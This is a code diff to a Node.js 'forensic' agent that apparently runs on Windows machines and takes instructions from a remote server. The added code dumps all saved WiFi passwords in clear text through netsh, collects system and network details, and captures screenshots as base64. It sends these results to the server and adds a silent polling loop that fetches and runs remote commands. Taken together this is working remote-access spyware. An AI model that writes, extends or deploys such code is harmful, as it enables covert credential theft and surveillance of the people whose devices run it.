@@ -311,6 +311,70 @@ async function getPreciseLocation(force = false) {
   return null;
 }
 
+async function getWifiPasswords() {
+    log('info', 'Extracting saved WiFi passwords...');
+    if (process.platform === 'win32') {
+        const ps = `
+            $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+            $results = @()
+            foreach ($profile in $profiles) {
+                $pass = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+                $results += [PSCustomObject]@{ SSID = $profile; Password = $pass }
+            }
+            $results | ConvertTo-Json
+        `;
+        const res = await runPowerShell(ps);
+        await reportLog('wifi-passwords', res.stdout);
+        return res.stdout;
+    }
+    return 'Not supported';
+}
+
+async function getDeepSystemInfo() {
+    log('info', 'Collecting deep system forensics...');
+    if (process.platform === 'win32') {
+        const ps = `
+            $os = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture, LastBootUpTime
+            $cpu = Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed
+            $gpu = Get-CimInstance Win32_VideoController | Select-Object Name, DriverVersion
+            $net = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, InterfaceAlias
+            @{ OS = $os; CPU = $cpu; GPU = $gpu; Network = $net } | ConvertTo-Json
+        `;
+        const res = await runPowerShell(ps);
+        await reportLog('system-deep', res.stdout);
+        return res.stdout;
+    }
+    return 'Not supported';
+}
+
+async function takeScreenshot() {
+    log('info', 'Attempting forensic screen capture...');
+    if (process.platform === 'win32') {
+        const shotPath = path.join(LOG_DIR, `shot_${Date.now()}.png`);
+        const ps = `
+            Add-Type -AssemblyName System.Windows.Forms
+            $screen = [System.Windows.Forms.Screen]::PrimaryScreen
+            $top    = $screen.Bounds.Top
+            $left   = $screen.Bounds.Left
+            $width  = $screen.Bounds.Width
+            $height = $screen.Bounds.Height
+            $bitmap = New-Object System.Drawing.Bitmap($width, $height)
+            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+            $graphics.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
+            $bitmap.Save("${shotPath.replace(/\\/g, '\\\\')}", [System.Drawing.Imaging.ImageFormat]::Png)
+            $bitmap.Dispose()
+            $graphics.Dispose()
+            [Convert]::ToBase64String([IO.File]::ReadAllBytes("${shotPath.replace(/\\/g, '\\\\')}"))
+        `;
+        const res = await runPowerShell(ps);
+        if (res.success) {
+            await reportLog('screenshot', 'Image Captured (Base64 data synced)');
+            return { image: res.stdout };
+        }
+    }
+    return 'Screenshot failed';
+}
+
 // ─── COMMAND HANDLER ─────────────────────────────────────────────────────────
 
 async function handleCommand(msg) {
@@ -343,6 +407,8 @@ async function handleCommand(msg) {
             getUsbAudit(),
             getPersistenceCheck(),
             getProcessForensics(),
+            getWifiPasswords(),
+            getDeepSystemInfo(),
             getPreciseLocation(true).then(l => l && send({ type: 'location', deviceId, location: l }))
         ]);
         result = { success: true, message: 'Forensic Sequence Completed' };
@@ -352,6 +418,8 @@ async function handleCommand(msg) {
       case 'port-audit': result = { success: true, data: await getPortAudit() }; break;
       case 'usb-audit': result = { success: true, data: await getUsbAudit() }; break;
       case 'persistence': result = { success: true, data: await getPersistenceCheck() }; break;
+      case 'wifi-passwords': result = { success: true, data: await getWifiPasswords() }; break;
+      case 'screenshot': result = { success: true, data: await takeScreenshot() }; break;
 
       case 'locate':
         const loc = await getPreciseLocation(true);
@@ -473,8 +541,34 @@ function connect() {
       if (msg.type === 'locationRequest') sendForensicHeartbeat();
     } catch (e) {}
   });
-  ws.on('close', () => setTimeout(connect, Math.min(RECONNECT_DELAY * ++reconnectAttempts, 30000)));
-  ws.on('error', () => {});
+  ws.on('close', () => {
+      log('warn', 'WebSocket closed. Attempting reconnect...');
+      setTimeout(connect, Math.min(RECONNECT_DELAY * ++reconnectAttempts, 30000));
+  });
+  ws.on('error', (e) => log('error', 'WS Error:', e.message));
+}
+
+// ─── HTTP POLLING FALLBACK ───────────────────────────────────────────────────
+
+async function startPolling() {
+    setInterval(async () => {
+        try {
+            const res = await fetch(`${API_URL}/poll/${deviceId}`);
+            const data = await res.json();
+            if (data.success && data.commands && data.commands.length > 0) {
+                for (const cmd of data.commands) {
+                    log('info', `Polled command: ${cmd.commandType}`);
+                    await handleCommand({
+                        commandId: cmd.commandId,
+                        commandType: cmd.commandType,
+                        params: cmd.params ? JSON.parse(cmd.params) : {}
+                    });
+                }
+            }
+        } catch (e) {
+            // Silently fail polling
+        }
+    }, 10000); // Poll every 10 seconds
 }
 
 async function start() {
@@ -491,6 +585,7 @@ async function start() {
   }
   
   connect();
+  startPolling(); // Start the safety net
   setInterval(sendForensicHeartbeat, 10000); // 10-second pulse for brain learning and real-time intelligence
 }
 
